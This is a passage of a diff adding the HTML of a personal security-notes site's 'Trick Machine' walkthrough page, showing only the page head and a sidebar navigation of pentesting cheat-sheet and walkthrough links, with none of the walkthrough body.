@@ -1,0 +1,2398 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="My personal knowledge repository">
+      
+      
+        <meta name="author" content="amandaguglieri">
+      
+      
+        <link rel="canonical" href="https://amandaguglieri.github.io/hackinglife/htb-trick/">
+      
+      
+        <link rel="prev" href="../htb-support/">
+      
+      
+        <link rel="next" href="../checksum/">
+      
+      <link rel="icon" href="../img/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.3">
+    
+    
+      
+        <title>Trick Machine - Hacking Life</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.6b71719e.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.2505c338.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#about-the-machine" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Hacking Life" class="md-header__button md-logo" aria-label="Hacking Life" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 7v10h2v-4h2v4h2V7h-2v4h-2V7H9M5 3h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hacking Life
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Trick Machine
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+            </label>
+          
+        
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="pink" data-md-color-accent="light-blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/amandaguglieri/hackinglife" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    amandaguglieri/hackinglife
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Hacking Life" class="md-nav__button md-logo" aria-label="Hacking Life" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 7v10h2v-4h2v4h2V7h-2v4h-2V7H9M5 3h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2Z"/></svg>
+
+    </a>
+    Hacking Life
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/amandaguglieri/hackinglife" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    amandaguglieri/hackinglife
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2" tabindex="0" aria-expanded="false">
+          Cheat sheets
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Cheat sheets" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Cheat sheets
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../amass/" class="md-nav__link">
+        amass
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../apktool/" class="md-nav__link">
+        apktool
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bash/" class="md-nav__link">
+        bash
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../acronyms/" class="md-nav__link">
+        cyber acronyms
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ctr/" class="md-nav__link">
+        crt.sh
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dnscan/" class="md-nav__link">
+        dnscan
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../drozer/" class="md-nav__link">
+        drozer
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../emacs/" class="md-nav__link">
+        emacs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../fping/" class="md-nav__link">
+        fping
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../frida/" class="md-nav__link">
+        frida
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../git/" class="md-nav__link">
+        git
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../google-dorks/" class="md-nav__link">
+        google dorks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hugo/" class="md-nav__link">
+        hugo
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../i3/" class="md-nav__link">
+        i3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../impacket/" class="md-nav__link">
+        impacket
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../markdown/" class="md-nav__link">
+        markdown
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mariadb/" class="md-nav__link">
+        mariadb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../masscan/" class="md-nav__link">
+        masscan
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mobsf/" class="md-nav__link">
+        mobsf
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mssql/" class="md-nav__link">
+        msSQL
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mysql/" class="md-nav__link">
+        mySQL
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nessus/" class="md-nav__link">
+        nessus
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../netcat/" class="md-nav__link">
+        netcat
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nmap/" class="md-nav__link">
+        nmap
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../objection/" class="md-nav__link">
+        objection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../openssl/" class="md-nav__link">
+        openSSL
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../p0f/" class="md-nav__link">
+        p0f
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ping/" class="md-nav__link">
+        ping
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../powershell/" class="md-nav__link">
+        powershell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqli/" class="md-nav__link">
+        sql injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqlmap/" class="md-nav__link">
+        sqlmap
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssh-tunneling/" class="md-nav__link">
+        ssh tunneling
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sublist3r/" class="md-nav__link">
+        sublist3r
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vim/" class="md-nav__link">
+        vim
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../winpeas/" class="md-nav__link">
+        winPEAS
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" tabindex="0" aria-expanded="false">
+          Courses
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Courses" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Courses
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_3_1" type="checkbox" id="__nav_3_1" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_1" tabindex="0" aria-expanded="false">
+          Hacking APIs
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Hacking APIs" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_1">
+          <span class="md-nav__icon md-icon"></span>
+          Hacking APIs
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/" class="md-nav__link">
+        Intro
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/apireconnaissance/" class="md-nav__link">
+        Api Reconnaissance
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/endpoint-analysis/" class="md-nav__link">
+        Endpoint Analysis
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/scanning-apis/" class="md-nav__link">
+        Scanning APIs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/api-authentication-attacks/" class="md-nav__link">
+        API authentication attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/exploiting-api-authorization/" class="md-nav__link">
+        Exploiting API Authorization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/improper-assets-management/" class="md-nav__link">
+        Improper assets management
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/mass-assignment/" class="md-nav__link">
+        Mass assignment
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/server-side-request-forgery/" class="md-nav__link">
+        Server-side Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/injection-attacks/" class="md-nav__link">
+        Injections attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/evasion-combining-techniques/" class="md-nav__link">
+        Evasion and combining techniques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/other-labs/" class="md-nav__link">
+        Labs
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ejpt/" class="md-nav__link">
+        eJPT
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" tabindex="0" aria-expanded="true">
+          Walkthroughs
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Walkthroughs" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Walkthroughs
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../htb-metatwo/" class="md-nav__link">
+        metatwo
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../htb-photobomb/" class="md-nav__link">
+        photobomb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../htb-support/" class="md-nav__link">
+        support
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          trick
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        trick
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#about-the-machine" class="md-nav__link">
+    About the machine
+  </a>
+  
+    <nav class="md-nav" aria-label="About the machine">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#service-port-enumeration" class="md-nav__link">
+    Service/ Port enumeration
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#directory-enumeration" class="md-nav__link">
+    Directory enumeration
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dns-enumeration" class="md-nav__link">
+    dns enumeration
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#edit-etchosts-file" class="md-nav__link">
+    Edit /etc/hosts file
+  </a>
+  
+    <nav class="md-nav" aria-label="Edit /etc/hosts file">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#directory-enumeration_1" class="md-nav__link">
+    Directory enumeration
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-a-sql-injection-vulnerability" class="md-nav__link">
+    Exploiting a sql injection vulnerability
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploiting a sql injection vulnerability">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dns-fuzzing" class="md-nav__link">
+    DNS fuzzing
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#edit-etchosts-file_1" class="md-nav__link">
+    Edit /etc/hosts file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#escalation-of-privileges" class="md-nav__link">
+    Escalation of privileges
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5" tabindex="0" aria-expanded="false">
+          Beginners' guide
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Beginners' guide" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Beginners' guide
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../checksum/" class="md-nav__link">
+        checksum
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pdm/" class="md-nav__link">
+        pdm
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../python/" class="md-nav__link">
+        python
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssh-for-github/" class="md-nav__link">
+        ssh for github
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6" tabindex="0" aria-expanded="false">
+          Pentesting web
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Pentesting web" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          Pentesting web
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../reverse-shells/" class="md-nav__link">
+        Reverse shells
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sql-injection/" class="md-nav__link">
+        sql injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7" tabindex="0" aria-expanded="false">
+          Network Services Pentestings
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Network Services Pentestings" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          Network Services Pentestings
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../21-ftp/" class="md-nav__link">
+        21 ftp
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../23-telnet/" class="md-nav__link">
+        23 telnet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../445-smb/" class="md-nav__link">
+        445 smb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../873-rsync/" class="md-nav__link">
+        873 rsync
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1433-mssql/" class="md-nav__link">
+        1433 mssql
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3306-mariadb-mysql/" class="md-nav__link">
+        3306 mariadb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3389-rdp/" class="md-nav__link">
+        3389 RDP
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5432-postgresql/" class="md-nav__link">
+        5432 postgresql
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6379-redis/" class="md-nav__link">
+        6379 redis
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../27017-27018-mongodb/" class="md-nav__link">
+        27017 mongodb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
